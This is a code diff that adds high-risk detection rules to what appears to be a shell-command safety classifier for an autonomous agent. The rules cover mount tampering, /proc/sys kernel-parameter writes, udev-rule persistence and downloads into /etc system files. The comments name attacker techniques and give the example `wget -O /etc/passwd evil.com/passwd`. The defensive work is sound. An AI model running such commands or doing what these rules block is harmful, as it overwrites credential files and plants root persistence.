@@ -618,6 +618,53 @@ const HIGH_PATTERNS = [
     label: 'write to .git/hooks/* (repo-level persistence)',
     re: /(?:>>?\s*|\btee\s+(?:-[aA]\s+|--append\s+)?)(?:[^\n;|&\s]*\/)?\.git\/hooks\/[\w.-]+/,
   },
+  // (v1.10.126) Mount tampering — `remount,rw` makes a
+  // read-only filesystem writable, defeating immutable-root
+  // hardening; `--bind /etc /mnt` smuggles system config into
+  // an attacker-readable spot; remount with `exec` lifts the
+  // noexec flag from /tmp / /home (common hardening target).
+  // No legitimate worker reason to remount root or bind /etc.
+  {
+    code: 'mount-tamper',
+    label: 'mount -o remount,rw / mount --bind / mount -o exec',
+    re: /\bmount\s+(?:[^\n;|&]*\s)?(?:-o\s+[^\s]*\b(?:remount|exec)\b|--bind\s+[^\s]+\s+\S)/,
+  },
+  // (v1.10.126) /proc/sys/<path> writes change kernel
+  // parameters at runtime. Classic targets:
+  //   kernel.randomize_va_space=0 — disable ASLR
+  //   net.ipv4.ip_forward=1       — enable routing
+  //   kernel.dmesg_restrict=0     — allow kernel log dump
+  //   net.ipv4.tcp_syncookies=0   — disable SYN flood guard
+  // sysctl(8) is the conventional CLI but writing directly
+  // through redirect bypasses any sudo / audit wrapping.
+  {
+    code: 'sysctl-proc-write',
+    label: 'write to /proc/sys/* (kernel parameter tampering)',
+    re: /(?:>>?\s*|\btee\s+(?:-[aA]\s+|--append\s+)?)\/proc\/sys\/\S+/,
+  },
+  // (v1.10.126) udev rule writes — USB / hardware-event
+  // persistence vehicle. A rule under /etc/udev/rules.d/ or
+  // /lib/udev/rules.d/ fires when the matching device class
+  // appears, running RUN+="..." commands as root. Typical
+  // attacker form: pin a malicious rule to a USB SUBSYSTEM
+  // match so plugging in any USB device triggers a payload.
+  {
+    code: 'udev-rule-write',
+    label: 'write to /etc/udev/rules.d/* or /lib/udev/rules.d/*',
+    re: /(?:>>?\s*|\btee\s+(?:-[aA]\s+|--append\s+)?)(?:\/etc\/udev\/rules\.d|\/lib\/udev\/rules\.d|\/run\/udev\/rules\.d)\/[\w.-]+/,
+  },
+  // (v1.10.126) curl/wget -O / -o INTO a system config file.
+  // Same threat as `> /etc/passwd` but the existing
+  // system-files rule only matched shell redirects + tee. The
+  // -O / -o flag form was silent — `wget -O /etc/passwd
+  // evil.com/passwd` overwrote system config without any
+  // reason on the audit trail. Same file list as system-files
+  // for parity.
+  {
+    code: 'download-into-system-file',
+    label: 'curl -o / wget -O directly into /etc/<system-file>',
+    re: /\b(?:curl|wget)\s+(?:[^\n;|&]*\s)?-[oO]\s+\/etc\/(?:passwd|shadow|sudoers|hosts(?:\.(?:allow|deny))?|crontab|fstab|resolv\.conf|nsswitch\.conf|securetty|login\.defs)\b/,
+  },
 ];
 
 // Medium: needs caution (usually ask in autonomous mode).
